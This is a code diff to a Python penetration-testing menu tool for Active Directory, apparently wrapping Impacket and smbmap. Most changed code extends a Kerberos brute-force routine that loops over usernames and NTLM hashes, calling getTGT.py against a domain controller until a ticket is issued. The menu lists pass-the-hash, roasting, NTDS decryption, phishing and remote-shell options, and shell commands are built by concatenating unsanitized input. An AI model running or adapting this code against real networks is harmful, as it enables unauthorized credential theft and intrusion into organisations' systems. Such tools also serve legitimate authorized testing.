@@ -76,14 +76,11 @@ def parsFile(variable):
    localCOM("sed -i '/^$/d' ./" + variable)
    return
 
-# PERFORM A LINE COUNT
+# PERFORM A PROPER LINE COUNT
 def lineCount(variable):
-   localCOM("cat " + variable + " | wc -l > count.tmp")
-   count = (linecache.getline("count.tmp", 1).rstrip("\n"))
-   count = extract_numbers(count)
-   count = count.rstrip(" ")
-   count = int(count)
-   return count
+    with open(variable, "r") as f:
+        lCounter = sum(1 for _ in f)
+    return lCounter
 
 # CLEAR TMP FILES   
 def clearClutter():
@@ -271,12 +268,12 @@ def dotPadding(variable,value):
 # PRIVILEGE CHECK A TICKET
 def privCheck():
    localCOM("ls  | grep ccache > ticket.tmp")   
-   count = lineCount("ticket.tmp")   
-   if count > 1:
+   lCount = lineCount("ticket.tmp")   
+   if lCount > 1:
       print("[i] More than one ticket was found...")
    else:
       print("[i] One ticket was found...")               
-   for x in range(1, count+1):
+   for x in range(1, lCount+1):
       ticket = linecache.getline("ticket.tmp", x).rstrip("\n")
       print("\n[+] " + ticket + "\n")
       ticket = ticket.rstrip(" ")
@@ -695,6 +692,7 @@ def smbParser(smbfile):
     cutLine("---------",smbfile)
     cutLine("^$",smbfile)
     cutLine("[+]",smbfile)
+    cutLine("do_connect", smbfile)
     return
 
 # DISPLAY SCREEN 
@@ -843,7 +841,7 @@ def options():
    print('\u2551' + "(05) Set WEBSITE URL (15) Set KERB  AUTH (35) DComExec (45) Enum EndPoints (55) ASREP Roasting (65) HASH2TICKET  (75) ExplCreator (85) GenListPass (95 ) Netcat   (235) Light Serv Scan (345) Edit Resolv.conf (445) EnumVirtHOST (604) BloodHoundDump (704) Certipy 4 (714) Certipy 14 " + '\u2551')
    print('\u2551' + "(06) Set USER   NAME (16) UNALLOCATED    (36) PS  Exec (46) Rpc ClientServ (56) TARGD Roasting (66) Disp  Ticket (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) FUZZ Sub-DOM (605) BloodyADdGroup (705) Certipy 5 (715) Certipy 15 " + '\u2551')
    print('\u2551' + "(07) Set PASS   WORD (17) Set  COMMUNITY (37) SMB Exec (47) Smb ClientServ (57) Pass the  HASH (67) PSExec  HASH (77) SNMP Walker (87)             (97 ) MySQL    (237) WordPress  Scan (347) Edit  Kerb5.conf (447) MAN CHISEL64 (606) BloodyADd User (706) Certipy 6 (716) Certipy 16 " + '\u2551')
-   print('\u2551' + "(08) Set NTLM   HASH (18) Set FUZZ RIDER (38) WMI Exec (48) Smb Map SHARES (58) Over Pass HASH (68) SmbExec HASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238) WP Plugin  Scan (348) ADD AD Usernames (448) AUTOCHISEL64 (607) ReactivateUser (707) Certipy 7 (717) Certipy 17 " + '\u2551')
+   print('\u2551' + "(08) Set NTLM   HASH (18) Set FUZZ RIDER (38) WMI Exec (48) Smb Map SHARES (58) GenTicket HASH (68) SmbExec HASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238) WP Plugin  Scan (348) ADD AD Usernames (448) AUTOCHISEL64 (607) ReactivateUser (707) Certipy 7 (717) Certipy 17 " + '\u2551')
    print('\u2551' + "(09) Set TICKET NAME (19) Set WORD  LIST (39) NFS List (49) Smb Dump Files (59) PASSWORD2HASH  (69) WmiExec HASH (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239) Nuclei  Scanner (349) LFI OS   Checker (449) SSHPort4Ward (608)                (708) Certipy 8 (718) BloodH GUI " + '\u2551')
    print('\u2551' + "(10) Set DOMAIN NAME (20) Set SERVERTIME (40) NFSMount (50) Smb MountSHARE (60) Enum4Linux     (70) STARTSERVERS (80) RemoteShell (90) Rsync Dumps (100) RDPBrute (240) Run LineCommand (350) HTTP Git  Dumper (450)", end= ' ')
    if proxyChains == 1:
@@ -2398,7 +2396,7 @@ while True:
             remoteCOM("smbmap --no-banner -x whoami -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -s " + TSH.rstrip(" "))         
             print(colored("[*] Mapping Shares...", colour3))
             remoteCOM("smbmap --no-banner -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -s " + TSH.rstrip(" ") + " --depth 15 > mapped.tmp")            
-            smbParser("mapped.tmo")
+            smbParser("mapped.tmp")
             parsFile("mapped.tmp")
             catsFile("mapped.tmp")
       prompt()
@@ -2552,10 +2550,8 @@ while True:
          else:
             test1 = linecache.getline("password1.tmp",1)   
             found = 1
-            USR,PAS = test1.split(":")
+            USR,PAS = test1.split(":")         
             USR = spacePadding(USR, COL1)
-            if PAS == "":
-               PAS = "'\'" 
             PAS = spacePadding(PAS, COL1)
             TGT = privCheck()                      
          if found == 0:
@@ -2567,7 +2563,7 @@ while True:
                test2 = linecache.getline("password2.tmp",1)   
                found = found + 1
                USR,PAS = test2.split(":")
-               USR = spacePadding(USR, COL1)
+               USR = spacePadding(USR, COL1)             
                PAS = spacePadding(PAS, COL1)
                TGT = privCheck()
          if found == 0:
@@ -2578,7 +2574,7 @@ while True:
             else:
                test3 = linecache.getline("password3.tmp",1)   
                USR,PAS = test3.split(":") 
-               USR = spacePadding(USR, COL1)
+               USR = spacePadding(USR, COL1)            
                PAS = spacePadding(PAS, COL1)
                TGT = privCheck()               
       prompt()
@@ -2676,8 +2672,9 @@ while True:
       if USR[:2] == "''":
          print("[-] Please enter a valid username for enumeration...")
          checkParam = 1              
-      if checkParam != 1:       
-         count = lineCount(dataDir + "/hashes.txt")         
+      if checkParam != 1:
+         print("[+] Using hash file " + FIL.rstrip(" ") + "...")
+         count = lineCount(dataDir + "/" + FIL.rstrip(" "))
          counter = 0                  
          if count > 12:
             marker = int(round(count/4))
@@ -2687,34 +2684,42 @@ while True:
          marker2 = marker * 2
          marker3 = marker * 3                                       
          if count > 0:
-            print("[+] Please wait, bruteforcing remote server using " + str(count) + " hashes...")                        
-            with open(dataDir + "/hashes.txt", "r") as force:
-               for brute in force:
-                  brute = brute.rstrip("\n")                               
-                  remoteCOM(keyPath + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + brute + " -dc-ip " + TIP.rstrip(" ") + " > datalog.tmp")
-                  counter = counter + 1
-                  localCOM("sed -i '1d' datalog.tmp")
-                  localCOM("sed -i '1d' datalog.tmp")                                 
-                  with open("datalog.tmp", "r") as ticket:
-                     checkFile = ticket.read()                                           
-                  if "[*] Saving ticket" in checkFile:
-                     print("[+] Ticket successfully generated for " + USR.rstrip(" ") + " using hash substitute " + str(USER[counter]).rstrip(" ") + ":" + brute + "...")                    
-                     TGT = privCheck()                         
-                     NTM = spacePadding(brute, COL1)
-                     checkParam = 2
-                     break                                                               
-                  if "Clock skew too great" in checkFile:
-                     print("[-] Clock skew too great, terminating...")
-                     checkParam = 2
-                     break                                                               
-                  if marker1 == counter:
-                     print("[i] 25% completed...")                                          
-                  if marker2 == counter:
-                     print("[i] 50% completed...")                                          
-                  if marker3 == counter:
-                     print("[i] 75% completed...")                                              
-            if checkParam != 2:
-               print("[-] 100% complete - exhausted!!...")
+            print(colored("[*] Please wait, bruteforcing remote server using " + str(count) + " hashes...", colour3))
+            with open(dataDir + "/usernames.txt", "r") as users:
+               for user in users:
+                  user = user.rstrip("\n").rstrip(" ")
+                  with open(dataDir + "/" + FIL.rstrip(" "), "r") as force:
+                     for brute in force:
+                        brute = brute.rstrip("\n")                               
+                        remoteCOM(keyPath + "getTGT.py " + DOM.rstrip(" ") +  "/" + user + " -hashes :" + brute + " -dc-ip " + TIP.rstrip(" ") + " > datalog.tmp")
+                        counter = counter + 1
+                        localCOM("sed -i '1d' datalog.tmp")
+                        localCOM("sed -i '1d' datalog.tmp")                                 
+                        with open("datalog.tmp", "r") as ticket:
+                           checkFile = ticket.read()                                           
+                        if "[*] Saving ticket" in checkFile:
+                           print("[+] Ticket successfully generated for " + user + " using hash substitute " + str(USER[counter]).rstrip(" ") + ":" + brute + "...")                                             
+                           USR = spacePadding(user, COL1)
+                           NTM = spacePadding(brute, COL1)
+                           TGT = privCheck()
+                           checkParam = 2
+                           break                                                               
+                        if "Clock skew too great" in checkFile:
+                           print("[-] Clock skew too great, terminating...")
+                           checkParam = 2
+                           break                                                               
+                        if marker1 == counter:
+                           print("[i] 25% completed...")                                          
+                        if marker2 == counter:
+                           print("[i] 50% completed...")                                          
+                        if marker3 == counter:
+                           print("[i] 75% completed...")                                              
+                     if checkParam == 2:
+                        break
+                  if checkParam == 2:
+                     break
+               if checkParam !=2: 
+                  print("[-] 100% complete - exhausted!!...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2730,7 +2735,7 @@ while True:
       if checkParam != 1:
          checkParam = test_DOM()               
       if checkParam != 1:
-         print(colored("[*] Trying to create TGT for user " + USR.rstrip(" ") + "...", colour3))                  
+         print(colored("[*] Trying to create TGT for user " + USR.rstrip(" ") + " with hash values...", colour3))                  
          if (NTM[:1] != ""):
             print("[i] Using HASH value as password credential...")
             remoteCOM(keyPath + "getTGT.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" "))                        
@@ -2916,6 +2921,8 @@ while True:
 
    if selection == '66':
       localCOM(keyPath + "describeTicket.py " + TGT.rstrip(" ") + " > ticket.tmp")
+      cutLine("Impacket v0.12.0", "ticket.tmp")
+      parsFile("ticket.tmp")
       catsFile("ticket.tmp")
       prompt() 
                
